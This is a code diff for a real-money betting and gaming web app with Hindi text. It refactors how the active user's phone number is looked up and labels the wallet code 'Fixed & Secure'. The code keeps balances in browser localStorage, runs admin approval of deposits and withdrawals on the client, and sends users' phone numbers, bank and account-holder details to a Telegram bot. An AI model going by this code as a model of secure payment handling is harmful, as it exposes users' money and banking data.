@@ -437,24 +437,31 @@ function sendTelegram(text) {
   fetch(url).catch(e => console.log(e));
 }
 
-// Multi-User Independent Wallet Management
+// Multi-User Independent Wallet Management (Fixed & Secure)
+function getActivePhone() {
+  return localStorage.getItem('mahakal_active_user') || loggedInPhone || "";
+}
+
 function getUserBalance() {
-  if (!loggedInPhone) return 19;
+  let phone = getActivePhone();
+  if (!phone) return 19;
   let allBalances = JSON.parse(localStorage.getItem('mahakal_user_wallets') || "{}");
   
-  if (allBalances[loggedInPhone] === undefined) {
-    allBalances[loggedInPhone] = 19; // Naye number ke liye shuruati balance ₹19
+  if (allBalances[phone] === undefined) {
+    allBalances[phone] = 19; // Naye number ke liye shuruati balance ₹19
     localStorage.setItem('mahakal_user_wallets', JSON.stringify(allBalances));
   }
-  return allBalances[loggedInPhone];
+  return allBalances[phone];
 }
 
 function saveUserBalance(newBal) {
-  if (!loggedInPhone) return;
+  let phone = getActivePhone();
+  if (!phone) return;
   let allBalances = JSON.parse(localStorage.getItem('mahakal_user_wallets') || "{}");
-  allBalances[loggedInPhone] = newBal;
+  allBalances[phone] = newBal;
   localStorage.setItem('mahakal_user_wallets', JSON.stringify(allBalances));
-  document.getElementById('balance').innerText = newBal;
+  let balEl = document.getElementById('balance');
+  if(balEl) balEl.innerText = newBal;
 }
 
 window.onload = function() {
@@ -495,7 +502,7 @@ window.onload = function() {
 
 function updateReferralLink() {
   let currentUrl = window.location.href.split('?')[0];
-  let myId = loggedInPhone || "USER" + Math.floor(Math.random() * 90000 + 10000);
+  let myId = getActivePhone() || "USER" + Math.floor(Math.random() * 90000 + 10000);
   document.getElementById('ref-link-input').value = `${currentUrl}?ref=${myId}`;
 }
 
@@ -535,7 +542,7 @@ function askAiSupport() {
 
 function sendQueryToTelegram() {
   let q = document.getElementById('user-query').value.trim();
-  let phone = loggedInPhone || "अज्ञात यूजर";
+  let phone = getActivePhone() || "अज्ञात यूजर";
   if(!q) return;
 
   sendTelegram(`🆘 Urgent Support Request from User!\n📱 Mobile: ${phone}\n💬 Problem: ${q}`);
@@ -568,7 +575,7 @@ function checkLoyalUserBonus() {
     localStorage.setItem('mahakal_199_bonus_claimed', 'true');
     timerMsg.innerText = "🎉 बधाई हो! 3 महीने पूरे होने पर ₹199 बोनस मिल गया है!";
     alert("🎉 बधाई हो! लगातार 3 महीने तक गेम खेलने और एक्टिव रहने पर आपको ₹199 का सीनियर बोनस मिल गया है!");
-    sendTelegram(`🎁 ₹199 3-Month Loyal User Bonus Credited!\n📱 Mobile: ${loggedInPhone || "Active User"}\n💰 Total Balance: ₹${currentBal}`);
+    sendTelegram(`🎁 ₹199 3-Month Loyal User Bonus Credited!\n📱 Mobile: ${getActivePhone() || "Active User"}\n💰 Total Balance: ₹${currentBal}`);
   } else {
     let daysLeft = Math.ceil((targetTime - timePassed) / (1000 * 60 * 60 * 24));
     timerMsg.innerText = `⏳ ₹199 सीनियर बोनस मिलने में ${daysLeft} दिन बाकी (3 महीने का नियम)...`;
@@ -726,10 +733,10 @@ function checkPuzzle(choice) {
     let win = bet * 2;
     currentBal += win;
     res.className = "msg"; res.innerText = `🎉 सही जवाब! ₹${win} जीत गए।`;
-    sendTelegram(`🧠 Puzzle Win!\n📱 User: ${loggedInPhone}\n💰 Bet: ₹${bet} | Won: ₹${win}`);
+    sendTelegram(`🧠 Puzzle Win!\n📱 User: ${getActivePhone()}\n💰 Bet: ₹${bet} | Won: ₹${win}`);
   } else {
     res.className = "error"; res.innerText = `❌ गलत जवाब! हार गए।`;
-    sendTelegram(`🧠 Puzzle Loss!\n📱 User: ${loggedInPhone}\n❌ Bet Lost: ₹${bet}`);
+    sendTelegram(`🧠 Puzzle Loss!\n📱 User: ${getActivePhone()}\n❌ Bet Lost: ₹${bet}`);
   }
   saveUserBalance(currentBal);
   currentP = (currentP + 1) % puzzles.length;
@@ -757,10 +764,10 @@ function rollDice() {
       let win = bet * 2;
       latestBal += win;
       res.className = "msg"; res.innerText = `🎉 पासा [${roll}] - ₹${win} जीत गए!`;
-      sendTelegram(`🎲 Ludo Win!\n📱 User: ${loggedInPhone}\n🎯 Roll: ${roll} | Won: ₹${win}`);
+      sendTelegram(`🎲 Ludo Win!\n📱 User: ${getActivePhone()}\n🎯 Roll: ${roll} | Won: ₹${win}`);
     } else {
       res.className = "error"; res.innerText = `❌ पासा [${roll}] - हार गए।`;
-      sendTelegram(`🎲 Ludo Loss!\n📱 User: ${loggedInPhone}\n🎯 Roll: ${roll} | Lost: ₹${bet}`);
+      sendTelegram(`🎲 Ludo Loss!\n📱 User: ${getActivePhone()}\n🎯 Roll: ${roll} | Lost: ₹${bet}`);
     }
     saveUserBalance(latestBal);
   }, 600);
@@ -781,7 +788,7 @@ function sendDepositReq() {
   let comm = Math.round(amt * 0.03);
 
   pendingDep = {
-    phone: loggedInPhone || "अज्ञात नंबर",
+    phone: getActivePhone() || "अज्ञात नंबर",
     amount: amt,
     upi: upiNum,
     txn: tx,
@@ -824,7 +831,7 @@ function sendWithdrawReq() {
   pendingWit = { amt: amt, final: finalAmt };
   msg.className = "msg"; msg.innerText = `⏳ निकासी अनुरोध स्वीकार! 2% काटकर शेष ₹${finalAmt} भेजने की प्रक्रिया जारी है।`;
   document.getElementById('adm-wit').innerText = `${b} | ₹${amt} (Final: ₹${finalAmt})`;
-  sendTelegram(`🏦 New Withdrawal Request!\n📱 User: ${loggedInPhone}\n🏛 Bank: ${b}\n👤 Holder: ${h}\n💸 Requested: ₹${amt}\n✂️ Final (2% cut): ₹${finalAmt}`);
+  sendTelegram(`🏦 New Withdrawal Request!\n📱 User: ${getActivePhone()}\n🏛 Bank: ${b}\n👤 Holder: ${h}\n💸 Requested: ₹${amt}\n✂️ Final (2% cut): ₹${finalAmt}`);
 }
 
 let tapC = 0, lastT = 0;
@@ -864,7 +871,8 @@ function toggleMasterLock() {
 
 function admUpdateBal() {
   let nb = parseFloat(document.getElementById('adm-new-bal').value);
-  if(!isNaN(nb) && loggedInPhone) {
+  let phone = getActivePhone();
+  if(!isNaN(nb) && phone) {
     saveUserBalance(nb);
     alert("✅ वर्तमान यूजर का वॉलेट बैलेंस अपडेट हो गया: ₹" + nb);
   } else {
@@ -882,7 +890,7 @@ function admDepYes() {
     allBalances[targetPhone] = currentTargetBal;
     localStorage.setItem('mahakal_user_wallets', JSON.stringify(allBalances));
 
-    if(loggedInPhone === targetPhone) {
+    if(getActivePhone() === targetPhone) {
       document.getElementById('balance').innerText = currentTargetBal;
     }
 
@@ -913,7 +921,7 @@ function admWitYes() {
     saveUserBalance(currentBal);
 
     alert(`✅ बैंक ट्रांसफर स्वीकृत! ₹${pendingWit.final} भेज दिए गए हैं।`);
-    sendTelegram(`✅ Withdrawal Paid! Sent ₹${pendingWit.final} to Bank for User: ${loggedInPhone}`);
+    sendTelegram(`✅ Withdrawal Paid! Sent ₹${pendingWit.final} to Bank for User: ${getActivePhone()}`);
     pendingWit = null; document.getElementById('adm-wit').innerText = "सफलतापूर्वक भेजे गए (Paid)";
   }
 }
